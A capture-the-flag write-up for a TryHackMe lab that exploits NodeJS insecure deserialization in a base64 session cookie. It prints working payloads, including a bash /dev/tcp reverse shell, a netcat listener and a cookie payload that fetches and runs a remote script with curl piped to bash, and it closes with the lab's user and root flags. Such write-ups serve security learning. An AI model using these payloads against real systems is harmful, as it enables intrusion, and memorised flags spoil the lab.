## NodeJS Insecure Deserialization - TryHackMe Writeup
**Overview**\
In JavaScript everything is a terrible mistake.\
This writeup demonstrates exploiting a NodeJS insecure deserialization vulnerability to achieve Remote Code Execution (RCE).

## Initial Setup
Start the target machine and ensure you're connected to TryHackMe VPN if using your own machine.

## Nmap Scan
Let's start with a basic port scan:
```bash
nmap -Pn 10.201.70.206 -v
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-18 13:07 +06
Initiating Parallel DNS resolution of 1 host. at 13:07
Completed Parallel DNS resolution of 1 host. at 13:07, 0.04s elapsed
Initiating SYN Stealth Scan at 13:07
Scanning 10.201.70.206 [1000 ports]
Discovered open port 80/tcp on 10.201.70.206
Discovered open port 22/tcp on 10.201.70.206
Completed SYN Stealth Scan at 13:08, 48.54s elapsed (1000 total ports)
Nmap scan report for 10.201.70.206
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```
Finding: Two ports are open - SSH (22) and HTTP (80).

## Web Application Analysis
**Port 80 Investigation**\
The website allows users to subscribe to newsletters using an email address. The site is built with NodeJS (visible from page indicators).
## Vulnerability Discovery
**Initial Testing**

1. Ran Gobuster directory enumeration - no significant findings
2. Focused on the email subscription functionality
3. Entered a test email and captured the HTTP request for analysis

## Critical Discovery
**Session Cookie Analysis:**

1. Found a session cookie that appeared to be base64 encoded
2. Decoded the cookie revealed a JSON object: {"email":"test@email.com"}
3. Our input was being serialized, stored in the cookie, then deserialized on each request

## Vulnerability Confirmation
**Test Process:**

1. Modified the email value in the decoded JSON
2. Re-encoded with base64
3. Replaced the session cookie in browser
4. Refreshed page - saw modified value reflected

**Conclusion: Confirmed NodeJS deserialization vulnerability.**
## RCE Testing
Used a payload from [opsecx](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) and tweaked it to ping my machine.\
```bash
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ping -c MACHINE_IP',
function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```
## Verification Steps:

1. Encoded the payload to base64
2. Set up listener: sudo tcpdump -i tun0 icmp
3. Replaced session cookie with encoded payload
4. Reloaded the page
Result: Received ping packets confirming RCE
## Exploitation Process
**Step 1: Generate Reverse Shell**\
Shell can be generated from many websites like [My Pentest Tools](https://tex2e.github.io/reverse-shell-generator/), [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), [Payload Playground](https://payloadplayground.com/generators/reverse-shell)
```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```
**Step 2: Start Netcat Listener**
```bash
nc -lvnp port_number
```
Note: Ensure the port matches your reverse shell payload port.

**Step 3: Host the Payload**
Save the shell payload to a file (e.g., shell.sh) and host it:
```bash
python3 -m http.server 5555
```
It will start a web server from where we can fetch our payload.

**Step 4: Modified Exploitation Payload**
Original ping payload:
```bash
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ping -c MACHINE_IP',
function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```
**Modified RCE payload:**
```bash
{"test":"_$$ND_FUNC$$_function(){\n  require('child_process').execSync(\"curl http://10.17.120.190:4455/shell.sh | bash\", function puts(error, stdout, stderr) {});\n}"} 
```
**Step 5: Execute Exploit**

1. Base64 encode the modified payload
2. Replace session cookie in browser with encoded payload
3. Reload the page
4. Receive reverse shell connection

## Post-Exploitation
**User Flag**
Navigate to /home/dylan/ directory to find the first flag.

## Privilege Escalation
**Check sudo privileges:**
```bash
sudo -l
Matching Defaults entries for ubuntu on ip-10-201-126-113:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ubuntu may run the following commands on ip-10-201-126-113:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```
Wasn't expecting that. Easy escalation: Full sudo access without password requirement.

## User flag: 0ba48780dee9f5677a4461f588af217c
## Root flag: 2cd5a9fd3a0024bfa98d01d69241760e

## Key Learning Points

1. Session Cookie Analysis: Always inspect and decode suspicious cookies
2. Deserialization Detection: Look for base64 encoded data containing JSON/objects
3. NodeJS Exploitation: The _$$ND_FUNC$$_ pattern enables function execution
4. Verification is Critical: Always confirm RCE before proceeding with exploitation
5. Payload Hosting: Simple HTTP servers are effective for payload delivery

## Important Note
Don't just copy-paste flags - understand the methodology. This knowledge will help you identify and exploit similar vulnerabilities in real-world scenarios.
